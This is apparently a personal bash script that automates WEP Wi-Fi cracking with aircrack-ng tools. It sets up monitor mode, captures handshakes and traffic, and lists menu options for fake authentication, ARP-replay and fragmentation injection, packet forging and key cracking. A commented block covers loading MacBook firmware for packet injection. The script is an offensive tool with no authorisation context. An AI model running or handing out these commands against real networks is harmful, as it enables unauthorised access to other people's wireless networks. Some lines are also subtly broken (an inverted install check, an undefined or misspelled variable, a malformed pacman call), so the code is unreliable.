#!/bin/bash


if which arp-scan > /dev/null 2>&1 ;then
    sudo pacman aircrack-ng net-tools arp-scan
fi

locaho="192.168.1.1"
#locaip=`arp-scan | peco | cut -d '\t' -f -1`
locaip="192.168.1.3"
eatnet=wlp2s0
arpfil=arp-request

#macbook {{{
### You need to have a compiler and headers for libc installed, since you will have to build fwcutter from source
## Install b43-fwcutter
#wget http://bues.ch/b43/fwcutter/b43-fwcutter-018.tar.bz2 http://bues.ch/b43/fwcutter/b43-fwcutter-018.tar.bz2.asc
#gpg --verify b43-fwcutter-018.tar.bz2.asc
#tar xjf b43-fwcutter-018.tar.bz2
#cd b43-fwcutter-018
#It's possible to use certain drivers under linux on a Macbook in order to inject in monitor mode, allowing for much wider greater usage of aircrack-ng.
#make B43_BCMA_EXTRA='y'; sudo make install
#
### If you are using the b43 driver from 3.2 kernel or newer:
## After installing b43-fwcutter, download version 5.100.138 of Broadcom's proprietary driver and extract the firmware from it:
#uname -r
#export FIRMWARE_INSTALL_DIR="/lib/firmware"
#wget http://www.lwfinger.com/b43-firmware/broadcom-wl-5.100.138.tar.bz2
#tar xjf broadcom-wl-5.100.138.tar.bz2
#sudo b43-fwcutter -w "$FIRMWARE_INSTALL_DIR" broadcom-wl-5.100.138/linux/wl_apsta.o
#
## To unload all known drivers (you can pick only one command, if you know which driver is in use) perform:
#sudo modprobe -r b43
#sudo modprobe -r brcmsmac
#sudo modprobe -r wl
#
## To load specific driver use one of the following commands:
#sudo modprobe b43
#sudo modprobe brcmsmac
#sudo modprobe wl
#
## ls module:
#lsmod
#
## start airodump-ng:
#iw list
#iwconfig
#sudo airmon-ng check kill
#sudo airmon-ng start wlp2s0b1
#sudo airodump-ng mon0 
#}}}

echo "
1...-a:airmon-ng start
"

case $# in
    1)

        case $1 in
            -a)
                sudo airmon-ng stop mon0
                sudo airmon-ng stop $eatnet
                sudo airmon-ng check kill
                sudo airmon-ng start $eatnet
                exit
                ;;
            *)

                filen=$1

                ;;

            esac

            sudo airodump-ng mon0 -w $filen

            cat ${filen}*.csv | peco > $filen

            bssid=`cat $filen | cut -d , -f -1`
            essid=`cat $filen | cut -d , -f 14-14 | tr -d ' '`
            macip=`ip link show mon0 | grep link | cut -d ' ' -f 6-6 | tr -d ' '`

            echo "
            1...sudo airodump-ng -c 1 --bssid $bssid -w cap mon0
            2...sudo aireplay-ng -1 0 -e $essid -a $bssid -h $macip mon0
            3...sudo aireplay-ng -3 -b $bssid -h $macip mon0
            4...sudo aircrack-ng cap.cap
            5...sudo aireplay-ng -1 0 -e $essid -a $bssid -h $you_macad mon0
            6...sudo aireplay-ng -5 -b $bssid -h $macip mon0
            7...sudo packetforge-ng -0 -a $bssid -h $macip -k $locho -l $locip -y *.xor -w arp-request
            8...sudo aireplay-ng -2 -r arp-request mon0
            "
            read key
            case $key in
                1)
                    sudo airodump-ng -c 1 --bssid $bssid -w cap mon0
                    ;;

                2)
                    sudo aireplay-ng -1 0 -e $essid -a $bssid -h $macip mon0

                    ;;

                3)
                    sudo aireplay-ng -3 -b $bssid -h $macip mon0
                    ;;
                4)
                    sudo aircrack-ng cap.cap
                    ;;
                5)

                    sudo aireplay-ng -1 0 -e $essid -a $bssid -h $macip mon0
                    ;;
                6)

                    sudo aireplay-ng -5 -b $bssid -h $macip mon0
                    ;;
                7)
                    sudo packetforge-ng -0 -a $bssid -h $macip -k $locho -l $locip -y *.xor -w $arpfil
                    ;;
                8)
                    sudo aireplay-ng -2 -r $arpfil mon0
                    ;;
            esac

esac
